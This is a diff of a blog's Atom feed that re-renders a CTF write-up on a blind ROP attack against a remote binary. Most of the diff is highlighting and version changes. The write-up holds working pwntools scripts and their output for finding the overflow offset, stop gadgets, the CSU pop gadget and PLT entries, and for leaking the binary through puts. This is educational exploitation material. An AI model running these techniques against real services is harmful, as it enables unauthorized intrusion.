@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?> 
 <feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
-    <generator uri="https://gohugo.io/" version="0.92.2">Hugo</generator><title type="html"><![CDATA[Blind Date on repr]]></title>
+    <generator uri="https://gohugo.io/" version="0.80.0">Hugo</generator><title type="html"><![CDATA[Blind Date on repr]]></title>
     
         <subtitle type="html"><![CDATA[pwn, RE, crypto stuff]]></subtitle>
     
@@ -8,7 +8,7 @@
     
             <link href="https://nasm.re/tags/Blind-Date/" rel="alternate" type="text/html" title="HTML" />
             <link href="https://nasm.re/tags/Blind-Date/feed.xml" rel="self" type="application/atom+xml" title="Atom" />
-    <updated>2022-07-29T20:34:46+02:00</updated>
+    <updated>2022-08-01T03:33:42+02:00</updated>
     
         <author>
             <name>nasm</name>
@@ -66,7 +66,7 @@ So, no source code is provided, we juste have a netcat to which we can interact.
     </h3>
 </div>
 <p>The first thing to do is to find from which offset the binary crashes, to do so I developped a small script:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/python3</span>
+<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/python3</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
@@ -79,16 +79,16 @@ So, no source code is provided, we juste have a netcat to which we can interact.
 
 <span class="k">def</span> <span class="nf">find_padding</span><span class="p">(</span><span class="n">p</span><span class="o">=</span><span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">):</span>
     <span class="n">padding</span> <span class="o">=</span> <span class="n">p</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span>
-    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] sending: </span><span class="si">{</span><span class="n">padding</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;[*] sending: {padding}&#34;</span><span class="p">)</span>
     <span class="n">resp</span> <span class="o">=</span> <span class="n">jmp</span><span class="p">(</span><span class="n">padding</span><span class="p">)</span>
-    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] recv: </span><span class="si">{</span><span class="n">resp</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;[*] recv: {resp}&#34;</span><span class="p">)</span>
     <span class="k">while</span> <span class="sa">b</span><span class="s2">&#34;Hello you.</span><span class="se">\n</span><span class="s2">What is your name ?</span><span class="se">\n</span><span class="s2">&gt;&gt;&gt; Thanks &#34;</span> <span class="o">+</span> <span class="n">padding</span> <span class="ow">in</span> <span class="n">resp</span><span class="p">:</span>
         <span class="k">return</span> <span class="n">find_padding</span><span class="p">(</span><span class="n">p</span><span class="o">=</span><span class="n">padding</span><span class="p">)</span>
     <span class="k">return</span> <span class="n">padding</span><span class="p">[:</span><span class="nb">len</span><span class="p">(</span><span class="n">padding</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="c1"># minus one char because we do not want that padding overwrite the return address / canary / triggering a crash</span>
 
-<span class="nb">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">find_padding</span><span class="p">()))</span>
+<span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">find_padding</span><span class="p">()))</span>
 </code></pre></div><p>It&rsquo;s basically sending checking if the right string is always received, and when it&rsquo;s not the case it assumes the remote program crashed and return the corresponding padding. We do not check to see if it prints <code>Bye!</code> right after the <code>Thanks input</code> because it sounds to be a puts which prints NULL byte terminated strings which makes that we can overlap some local pointers and print them like below:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ ./solve.py
+<div class="highlight"><pre class="chroma"><code class="language-Shell" data-lang="Shell">$ ./solve.py
 <span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90&#39;</span>
 <span class="o">[</span>*<span class="o">]</span> recv: b<span class="s1">&#39;Hello you.\nWhat is your name ?\n&gt;&gt;&gt; Thanks \x90Bye!\n&#39;</span>
 <span class="o">[</span>*<span class="o">]</span> sending: b<span class="s1">&#39;\x90\x90&#39;</span>
@@ -183,15 +183,15 @@ So, no source code is provided, we juste have a netcat to which we can interact.
 </div>
 <p>Stack reading is just basically a bruteforce of some bytes to trigger the orginal behaviour of the program. It permits especially to leak a stack canary or some saved instruction pointers. But I directly tried to find some stop gadgets, to do so, I&rsquo;m looking for something in the response. And the best stop gadget would be a unique pattern.</p>
 <p>I developped this small function:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="k">def</span> <span class="nf">try_jmp</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
-    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="k">def</span> <span class="nf">try_jmp</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
         <span class="k">try</span><span class="p">:</span>
             <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
             <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
             <span class="n">resp</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">500</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">30.0</span><span class="p">)[</span><span class="mi">35</span><span class="p">:]</span>
             <span class="k">break</span>
         <span class="k">except</span><span class="p">:</span>
-            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;STOP: </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">exc_info</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;STOP: {sys.exc_info()[0]}&#34;</span><span class="p">)</span>
             <span class="n">resp</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> 
             <span class="k">break</span>
 
@@ -203,7 +203,7 @@ So, no source code is provided, we juste have a netcat to which we can interact.
         <span class="n">resp</span> <span class="o">=</span> <span class="n">try_jmp</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
         <span class="c1"># print(f&#34;Trying on {hex(int.from_bytes(leak1+p8(i), &#39;little&#39;) &lt;&lt; (64 - counter*8))}&#34;)</span>
         <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">resp</span><span class="p">):</span>
-            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">padd</span><span class="p">(</span><span class="n">leak1</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="n">i</span><span class="p">)),</span> <span class="s1">&#39;little&#39;</span><span class="p">))</span><span class="si">}</span><span class="s2">] Output: </span><span class="si">{</span><span class="n">resp</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;[{hex(int.from_bytes(padd(leak1+p8(i)), &#39;little&#39;))}] Output: {resp}&#34;</span><span class="p">)</span>
             <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">leak1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">8</span><span class="p">:</span>
                 <span class="n">leak2</span><span class="p">(</span><span class="n">padding</span><span class="p">,</span> <span class="n">leak1</span><span class="o">=</span><span class="n">leak1</span><span class="o">+</span><span class="n">p8</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
             <span class="k">else</span><span class="p">:</span>
@@ -214,7 +214,7 @@ So, no source code is provided, we juste have a netcat to which we can interact.
 
 <span class="n">leak2</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mi">40</span><span class="p">)</span>
 </code></pre></div><p>Which returns:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ ./solve.py
+<div class="highlight"><pre class="chroma"><code class="language-Shell" data-lang="Shell">$ ./solve.py
 <span class="o">[</span>0x5<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@&#39;</span>
 <span class="o">[</span>0x605<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@&#39;</span>
 <span class="o">[</span>0x400605<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x05\x06@&#39;</span>
@@ -245,15 +245,15 @@ STOP: &lt;class <span class="s1">&#39;KeyboardInterrupt&#39;</span>&gt;
     </h3>
 </div>
 <p>We can optimize the search of stop gadgets by bruteforcing only the two less significant bytes about the base address: <code>0x400000</code>, which gives this:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="k">def</span> <span class="nf">try_jmp</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
-    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="k">def</span> <span class="nf">try_jmp</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
         <span class="k">try</span><span class="p">:</span>
             <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
             <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
             <span class="n">resp</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">500</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">30.0</span><span class="p">)[</span><span class="mi">35</span><span class="p">:]</span>
             <span class="k">break</span>
         <span class="k">except</span><span class="p">:</span>
-            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;STOP: </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">exc_info</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;STOP: {sys.exc_info()[0]}&#34;</span><span class="p">)</span>
             <span class="n">resp</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> 
             <span class="k">break</span>
 
@@ -267,14 +267,14 @@ STOP: &lt;class <span class="s1">&#39;KeyboardInterrupt&#39;</span>&gt;
         <span class="n">resp</span> <span class="o">=</span> <span class="n">try_jmp</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
         <span class="c1"># print(f&#34;Trying on {hex(int.from_bytes(leak1+p8(i), &#39;little&#39;) &lt;&lt; (64 - counter*8))}&#34;)</span>
         <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">resp</span><span class="p">):</span>
-            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">] Output: </span><span class="si">{</span><span class="n">resp</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;[{hex(base+i)}] Output: {resp}&#34;</span><span class="p">)</span>
             <span class="k">continue</span>
 
     <span class="k">return</span> <span class="n">leak1</span>
 
 <span class="n">leak2</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mi">40</span><span class="p">)</span>
 </code></pre></div><p>Which prints:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ ./solve.py
+<div class="highlight"><pre class="chroma"><code class="language-Shell" data-lang="Shell">$ ./solve.py
 <span class="o">[</span>0x4004cc<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xcc\x04@&#39;</span>
 <span class="o">[</span>0x4004cd<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xcd\x04@&#39;</span>
 <span class="o">[</span>0x4004dd<span class="o">]</span> Output: b<span class="s1">&#39;Thanks aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xdd\x04@&#39;</span>
@@ -369,7 +369,7 @@ And so for our attack we will use it.</p>
     </h3>
 </div>
 <p>Since we got the stop gadget, everything is easier. We just have to scan the .text of the remote binary to find the brop gadget which is basically the end of the csu in most of the binaries. It&rsquo;s easy to find because it&rsquo;s a pop of six qword like that:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">pop     rbx
+<div class="highlight"><pre class="chroma"><code class="language-Shell" data-lang="Shell">pop     rbx
 pop     rbp
 pop     r12
 pop     r13
@@ -378,21 +378,21 @@ pop     r15
 retn
 </code></pre></div><p>So we use a <code>probe + trap * 6 + stop + trap*20</code> payload to find these kinf od gadgets.
 And so here is the script:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="k">def</span> <span class="nf">unpadd</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="k">def</span> <span class="nf">unpadd</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
     <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
 
 <span class="k">def</span> <span class="nf">is_stop</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">ip</span><span class="p">,</span> <span class="n">padding</span><span class="p">):</span>
     <span class="k">return</span> <span class="p">(</span><span class="n">ip</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">STOP_GADGETS</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">s</span> <span class="o">==</span> <span class="sa">b</span><span class="s2">&#34;Thanks &#34;</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">unpadd</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">ip</span><span class="p">))</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;&gt;&gt;&gt; &#34;</span><span class="p">)</span> 
 
 <span class="k">def</span> <span class="nf">try_jmp</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
-    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
         <span class="k">try</span><span class="p">:</span>
             <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
             <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
             <span class="n">resp</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">500</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">30.0</span><span class="p">)[</span><span class="mi">35</span><span class="p">:]</span>
             <span class="k">break</span>
         <span class="k">except</span><span class="p">:</span>
-            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;STOP: </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">exc_info</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;STOP: {sys.exc_info()[0]}&#34;</span><span class="p">)</span>
             <span class="n">resp</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> 
             <span class="k">break</span>
 
@@ -405,17 +405,17 @@ And so here is the script:</p>
         <span class="n">buf</span> <span class="o">=</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="o">*</span> <span class="mi">6</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">STOP_GADGETS</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
         <span class="n">resp</span> <span class="o">=</span> <span class="n">try_jmp</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
         <span class="k">if</span> <span class="n">is_stop</span><span class="p">(</span><span class="n">resp</span><span class="p">,</span> <span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">padding</span><span class="p">):</span>
-            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Output: </span><span class="si">{</span><span class="n">resp</span><span class="si">}</span><span class="s2">, leak: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="n">i</span><span class="p">),</span> <span class="s1">&#39;little&#39;</span><span class="p">))</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;Output: {resp}, leak: {hex(int.from_bytes(p64(base + i), &#39;little&#39;))}&#34;</span><span class="p">)</span>
             <span class="k">break</span>
 
         <span class="k">if</span> <span class="ow">not</span> <span class="n">i</span> <span class="o">%</span> <span class="mi">35</span><span class="p">:</span>
-            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;_ - </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;_ - {hex(i)}&#34;</span><span class="p">)</span>
 
     <span class="k">return</span> <span class="n">base</span> <span class="o">+</span> <span class="n">i</span>
 
 <span class="n">find_brop</span><span class="p">(</span><span class="s2">&#34;a&#34;</span><span class="o">*</span><span class="mi">40</span><span class="p">)</span>
 </code></pre></div><p>Which returns:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ ./solve.py
+<div class="highlight"><pre class="chroma"><code class="language-Shell" data-lang="Shell">$ ./solve.py
 _ - 0x0
 _ - 0x23
 _ - 0x46
@@ -488,7 +488,7 @@ To find the PLT there is three rules:</p>
 </ul>
 <p>I used so a payload&rsquo;s structure like this: <code>padding + POP_RDI + 0x400000 + POP_RSI_R15 + 0x400000 + probe + stop + trap</code>
 That&rsquo;s how I developped this function:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">POP_RDI</span> <span class="o">=</span> <span class="n">CSU_POP</span><span class="o">+</span><span class="mh">0x9</span>
+<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="n">POP_RDI</span> <span class="o">=</span> <span class="n">CSU_POP</span><span class="o">+</span><span class="mh">0x9</span>
 <span class="n">POP_RSI_R15</span> <span class="o">=</span> <span class="n">CSU_POP</span><span class="o">+</span><span class="mh">0x7</span>
 
 <span class="k">def</span> <span class="nf">unpadd</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
@@ -498,14 +498,14 @@ That&rsquo;s how I developped this function:</p>
     <span class="k">return</span> <span class="p">(</span><span class="n">ip</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">STOP_GADGETS</span><span class="p">)</span> <span class="ow">and</span> <span class="p">(</span><span class="n">s</span> <span class="o">==</span> <span class="sa">b</span><span class="s2">&#34;Thanks &#34;</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">unpadd</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">ip</span><span class="p">))</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;&gt;&gt;&gt; &#34;</span><span class="p">)</span> 
 
 <span class="k">def</span> <span class="nf">try_jmp</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
-    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
         <span class="k">try</span><span class="p">:</span>
             <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
             <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
             <span class="n">resp</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">500</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">30.0</span><span class="p">)[</span><span class="mi">35</span><span class="p">:]</span>
             <span class="k">break</span>
         <span class="k">except</span><span class="p">:</span>
-            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;STOP: </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">exc_info</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;STOP: {sys.exc_info()[0]}&#34;</span><span class="p">)</span>
             <span class="n">resp</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> 
             <span class="k">break</span>
 
@@ -519,12 +519,12 @@ That&rsquo;s how I developped this function:</p>
         <span class="n">resp1</span> <span class="o">=</span> <span class="n">try_jmp</span><span class="p">(</span><span class="n">padding</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RDI</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">POP_RSI_R15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">STOP_GADGETS</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">))</span> <span class="c1"># I used the base address because it&#39;s an recognizable pattern</span>
 
         <span class="k">if</span> <span class="n">is_stop</span><span class="p">(</span><span class="n">resp1</span><span class="p">,</span> <span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">,</span> <span class="n">padding</span><span class="p">):</span>
-            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Output: </span><span class="si">{</span><span class="n">resp1</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s2">, leak: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">base</span> <span class="o">+</span> <span class="n">i</span><span class="p">),</span> <span class="s1">&#39;little&#39;</span><span class="p">))</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;Output: {resp1.hex()}, leak: {hex(int.from_bytes(p64(base + i), &#39;little&#39;))}&#34;</span><span class="p">)</span>
 
         <span class="k">elif</span> <span class="nb">len</span><span class="p">(</span><span class="n">resp1</span><span class="p">):</span>
-            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">] Out: </span><span class="si">{</span><span class="n">resp1</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;[{hex(base+i)}] Out: {resp1.hex()}&#34;</span><span class="p">)</span>
 </code></pre></div><p>And we got this:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ ./solve.py
+<div class="highlight"><pre class="chroma"><code class="language-Shell" data-lang="Shell">$ ./solve.py
 <span class="o">[</span>0x400500<span class="o">]</span> Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307407f454c460201010a3e3e3e20
 <span class="o">[</span>0x400510<span class="o">]</span> Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307407f454c460201013e3e3e20
 <span class="o">[</span>0x400520<span class="o">]</span> Out: 5468616e6b7320414141414141414141414141414141414141414141414141414141414141414141414141414141414307403e3e3e20
@@ -547,7 +547,7 @@ That&rsquo;s how I developped this function:</p>
 <p>Since we can leak an arbitrary location it&rsquo;s really easier !
 We can see that the patter which leaks is like: <code>Thanks + padding + unpadd(p64(POP_RDI)) + leak_upto_null_byte</code>.
 So we can leak all the binary from the base address:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">STOP_GADGETS</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x400668</span><span class="p">]</span>
+<div class="highlight"><pre class="chroma"><code class="language-py" data-lang="py"><span class="n">STOP_GADGETS</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x400668</span><span class="p">]</span>
 <span class="n">POP_RDI</span> <span class="o">=</span> <span class="n">CSU_POP</span><span class="o">+</span><span class="mh">0x9</span>
 <span class="n">POP_RSI_R15</span> <span class="o">=</span> <span class="n">CSU_POP</span><span class="o">+</span><span class="mh">0x7</span>
 
@@ -555,14 +555,14 @@ So we can leak all the binary from the base address:</p>
     <span class="k">return</span> <span class="n">s</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
 
 <span class="k">def</span> <span class="nf">try_jmp</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
-    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
         <span class="k">try</span><span class="p">:</span>
             <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
             <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
             <span class="n">resp</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">500</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">30.0</span><span class="p">)[</span><span class="mi">35</span><span class="p">:]</span>
             <span class="k">break</span>
         <span class="k">except</span><span class="p">:</span>
-            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;STOP: </span><span class="si">{</span><span class="n">sys</span><span class="o">.</span><span class="n">exc_info</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;STOP: {sys.exc_info()[0]}&#34;</span><span class="p">)</span>
             <span class="n">resp</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span> 
             <span class="k">break</span>
 
@@ -587,20 +587,20 @@ So we can leak all the binary from the base address:</p>
         
         <span class="k">if</span> <span class="ow">not</span> <span class="nb">len</span><span class="p">(</span><span class="n">leak</span><span class="p">):</span> <span class="c1"># if no leak it means it&#39;s a null byte</span>
             <span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span>
-            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] recv @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">base</span><span class="o">+</span><span class="n">i</span><span class="p">)</span><span class="si">}</span><span class="s2">: 0x00&#34;</span><span class="p">)</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">&#34;[*] recv @ {hex(base+i)}: 0x00&#34;</span><span class="p">)</span>
             <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
         <span class="k">else</span><span class="p">:</span> <span class="c1"># else we got raw data leaked</span>
             <span class="n">buf</span> <span class="o">+=</span> <span class="n">leak</span>
